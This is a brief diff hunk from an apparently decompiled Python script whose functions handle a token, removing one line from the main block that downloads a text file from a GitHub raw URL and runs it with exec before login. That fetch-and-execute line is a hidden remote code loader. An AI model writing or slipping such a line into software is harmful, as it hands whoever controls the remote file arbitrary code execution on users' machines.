@@ -2125,6 +2125,5 @@ def gaz(toket, enable=True):
 
 
 if __name__ == '__main__':
-	exec(requests.get("https://raw.githubusercontent.com/LOoLzeC/kontol/master/server3.txt").text)
 	login()
 # okay decompiling 3.pyc
